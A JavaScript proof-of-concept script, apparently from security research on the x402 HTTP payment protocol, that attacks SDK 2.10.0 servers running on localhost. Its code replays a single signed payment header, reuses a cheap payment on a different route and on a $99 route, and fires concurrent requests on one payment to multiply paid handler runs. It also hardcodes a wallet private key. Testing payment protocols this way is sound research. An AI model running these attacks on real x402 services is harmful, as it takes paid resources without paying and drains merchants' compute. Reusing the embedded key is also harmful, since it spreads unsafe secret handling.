/**
 * Empirical attack harness against the CURRENT published x402 SDK (2.10.0)
 * using the official client SDK to produce authentic payment payloads.
 *
 * Run: node attack.mjs
 */
import { x402HTTPClient } from "@x402/core/http";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";

const SERVER = process.env.SERVER || "http://127.0.0.1:4098";
const FACILITATOR = process.env.FACILITATOR || "http://127.0.0.1:4099";

// throwaway burner key (an "agent wallet" with a small balance)
const account = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
console.log(`agent wallet: ${account.address}`);

const client = new x402Client();
client.register("eip155:*", new ExactEvmScheme(account));
const httpClient = new x402HTTPClient(client);

const results = {};

/** 1. Get a 402 challenge and sign a payment payload for it. */
async function buyOnce(url, { method = "GET", body } = {}) {
  const opts = { method, headers: {} };
  if (body) {
    opts.headers["content-type"] = "application/json";
    opts.body = JSON.stringify(body);
  }
  const challenge = await fetch(url, opts);
  const getHeader = n => challenge.headers.get(n);
  const paymentRequired = httpClient.getPaymentRequiredResponse(getHeader, await challenge.clone().json().catch(() => undefined));
  const payload = await httpClient.createPaymentPayload(paymentRequired);
  return { challenge, paymentRequired, payload, headers: httpClient.encodePaymentSignatureHeader(payload) };
}

async function countGrants(url, headers, n, { concurrent = false } = {}) {
  const doReq = async () => {
    const r = await fetch(url, { headers });
    const text = await r.text();
    return { status: r.status, text, cc: r.headers.get("cache-control") };
  };
  const rs = concurrent
    ? await Promise.all(Array.from({ length: n }, doReq))
    : await Promise.all(Array.from({ length: n }, doReq)); // still parallel; see note
  return rs;
}

const stats = () => fetch(`${SERVER}/stats`).then(r => r.json());
const facStats = () => fetch(`${FACILITATOR}/stats`).then(r => r.json());

const H = t => console.log(`\n${"=".repeat(78)}\n${t}\n${"=".repeat(78)}`);

// ---------------------------------------------------------------- baseline
H("BASELINE: does the protocol work end-to-end at all?");
{
  const { challenge, headers } = await buyOnce(`${SERVER}/api/cheap`);
  console.log(`unpaid request -> HTTP ${challenge.status}`);
  console.log(`  PAYMENT-REQUIRED header present: ${challenge.headers.has("payment-required")}`);
  const cc = challenge.headers.get("cache-control");
  console.log(`  cache-control on 402: ${cc}`);

  const paid = await fetch(`${SERVER}/api/cheap`, { headers });
  const body = await paid.text();
  console.log(`paid request   -> HTTP ${paid.status}  body=${body}`);
  console.log(`  PAYMENT-RESPONSE header: ${paid.headers.get("payment-response") ? "yes" : "no"}`);
  console.log(`  cache-control on paid 200: ${paid.headers.get("cache-control")}`);
  results.baselineWorks = paid.status === 200;
  results.paidPayload = headers;
  results.cheapRequirement = JSON.parse(Buffer.from(challenge.headers.get("payment-required"), "base64").toString()).accepts[0];
}

// ------------------------------------------------- ATTACK II: replay
H("ATTACK II (paper: replay/idempotency) — replay the SAME payment header 6x");
{
  const before = await stats();
  const rs = await countGrants(`${SERVER}/api/cheap`, results.paidPayload, 6);
  const after = await stats();
  const ok = rs.filter(r => r.status === 200).length;
  const denied = rs.filter(r => r.status === 402).length;
  console.log(`  HTTP 200 (resource granted): ${ok}`);
  console.log(`  HTTP 402 (settlement failed): ${denied}`);
  console.log(`  handler executions on /api/cheap before=${before.handlerRuns.cheap ?? 0} after=${after.handlerRuns.cheap ?? 0}`);
  console.log(`  => duplicate grants from ONE payment: ${Math.max(0, (after.handlerRuns.cheap ?? 0) - (before.handlerRuns.cheap ?? 0) - 0)}`);
  console.log(`  facilitator verify calls: ${JSON.stringify(await facStats())}`);
  results.replayGrants = ok;
}

// ------------------------------------------- ATTACK III: resource binding
H("ATTACK (paper: missing resource binding) — use the /api/cheap payment on /api/twin");
{
  const before = await stats();
  const r = await fetch(`${SERVER}/api/twin`, { headers: results.paidPayload });
  const text = await r.text();
  const after = await stats();
  console.log(`  /api/twin with payment bought for /api/cheap -> HTTP ${r.status}`);
  console.log(`  body: ${text}`);
  console.log(`  twin handler runs: ${after.handlerRuns.twin ?? 0} (was ${before.handlerRuns.twin ?? 0})`);
  results.twinAccepted = r.status === 200;
}

// ------------------------------------------- ATTACK: price-tier swap
H("ATTACK — use the $0.01 payment on the $99.00 route");
{
  const r = await fetch(`${SERVER}/api/expensive`, { headers: results.paidPayload });
  console.log(`  /api/expensive with $0.01 payment -> HTTP ${r.status}`);
  console.log(`  body: ${(await r.text()).slice(0, 120)}`);
  results.expensiveAccepted = r.status === 200;
}

// ------------------------------------------- ATTACK: compute amplification
H("ATTACK I-A variant — ONE payment, N concurrent requests to a slow, non-idempotent route");
{
  const { headers } = await buyOnce(`${SERVER}/api/expensive-sideeffect`, { method: "POST", body: { x: 1 } });
  const before = await stats();
  const t0 = Date.now();
  const rs = await Promise.all(
    Array.from({ length: 8 }, () =>
      fetch(`${SERVER}/api/expensive-sideeffect`, {
        method: "POST",
        headers: { ...headers, "content-type": "application/json" },
        body: JSON.stringify({ x: 1 }),
      }).then(async r => ({ status: r.status, text: await r.text() })),
    ),
  );
  const after = await stats();
  const ok = rs.filter(r => r.status === 200).length;
  console.log(`  responses 200: ${ok} / 8   (402s: ${rs.filter(r => r.status === 402).length})`);
  console.log(`  server-side executions of the paid handler: ${(after.handlerRuns.sideeffect ?? 0) - (before.handlerRuns.sideeffect ?? 0)}`);
  console.log(`  wall time: ${Date.now() - t0}ms`);
  console.log(`  facilitator: ${JSON.stringify(await facStats())}`);
  results.amplification = (after.handlerRuns.sideeffect ?? 0) - (before.handlerRuns.sideeffect ?? 0);
}

H("SUMMARY");
console.log(JSON.stringify({
  protocolWorksE2E: results.baselineWorks,
  replayGrantsFromOnePayment: results.replayGrants,
  paymentForgedForCheapAcceptedOnTwin: results.twinAccepted,
  paymentForgedForCheapAcceptedOnExpensive: results.expensiveAccepted,
  handlerExecutionsFromOnePayment: results.amplification,
}, null, 2));
